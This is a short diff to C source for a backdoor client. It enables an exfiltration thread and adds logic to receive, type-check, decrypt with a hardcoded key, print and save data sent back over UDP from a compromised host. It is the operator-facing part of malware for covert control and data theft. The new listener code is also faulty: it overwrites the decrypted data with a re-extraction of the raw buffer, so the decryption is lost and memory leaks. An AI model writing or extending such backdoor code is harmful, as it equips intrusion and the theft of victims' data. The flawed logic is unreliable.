@@ -21,7 +21,7 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 	struct sockaddr_in saddr;
 	char command[MAX_LEN];
 	pthread_t list_thread;
-//	pthread_t exfil_thread;
+	pthread_t exfil_thread;
 
 	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 	bzero(&saddr, sizeof(saddr));
@@ -43,7 +43,7 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 	}
 
 	// exfil thread
-	//	pthread_create(&exfil_thread, NULL, exfil_listen, &ipaddr);
+	pthread_create(&exfil_thread, NULL, exfil_listen, &ipaddr);
 	
 	printf("Ready, awaiting your command...\n");
 	while(fgets(command, MAX_LEN, stdin) != NULL)
@@ -65,7 +65,7 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 		pthread_join(list_thread, NULL);
 	}
 
-	//	pthread_join(exfil_thread, NULL);
+	pthread_join(exfil_thread, NULL);
 }
 
 void *listen_thread(void *arg)
@@ -138,12 +138,26 @@ void* exfil_listen(void *arg)
 
 	while (TRUE)
 	{
-		char *pbuf;
+		char *data;
+		char type;
+		int len;
+
 		ret = read(sock, &buf, MAX_LEN);
-		pbuf = extract_udp(src_addr, buf, ret);
-		printf("%s", pbuf);
-		fwrite(pbuf, 2, 1, file);
-		free(pbuf);
+
+		data = getTransmission(buf, &len, &type);
+
+		if (type == XFL_TYP)
+		{
+			data = decrypt(SEKRET, data, len);
+
+			data = extract_udp(src_addr, buf, ret);
+
+			printf("%s", data);
+
+			fwrite(data, 2, 1, file);
+
+			free(data);
+		}
 	}
 
 	fclose(file);
